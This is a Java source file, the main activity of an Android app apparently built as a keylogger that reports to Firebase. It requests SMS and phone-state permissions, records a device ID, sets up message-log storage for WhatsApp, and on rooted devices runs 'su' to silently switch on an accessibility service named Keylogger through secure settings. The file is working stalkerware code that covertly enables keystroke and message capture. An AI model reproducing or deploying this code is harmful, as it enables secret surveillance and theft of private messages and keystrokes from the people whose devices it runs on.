package com.ashish.keyloggerfirebaseservice;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.os.Looper;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        SharedPreferences sharedpreferences = getSharedPreferences("Name_of_Pref", Context.MODE_PRIVATE);
        SharedPreferences.Editor editor=sharedpreferences.edit();
        ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.READ_SMS}, PackageManager.PERMISSION_GRANTED);
        ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE}, 101);
        editor.putString("DEVICE-ID", "DeviceId-"+getDeviceId(this));
        if (sharedpreferences.getString("LAST-MESSAGE-ID",null)==null)
        editor.putString("LAST-MESSAGE-ID","");
        if (sharedpreferences.getString("WHATSAPP-MESSAGE-LOG",null)==null)
        editor.putString("WHATSAPP-MESSAGE-LOG","");
        editor.commit();
        (new Startup()).execute();

    }
    private class Startup extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }
    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                // su will work only on the rooted devices
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.sribalaji.keylogger/com.sribalaji.keylogger.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    public static String getDeviceId(Context context) {

        String deviceId;

        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            deviceId = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID);
        } else {
            final TelephonyManager mTelephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (mTelephony.getDeviceId() != null) {
                deviceId = mTelephony.getDeviceId();
            } else {
                deviceId = Settings.Secure.getString(
                        context.getContentResolver(),
                        Settings.Secure.ANDROID_ID);
            }
        }

        return deviceId;
    }
}
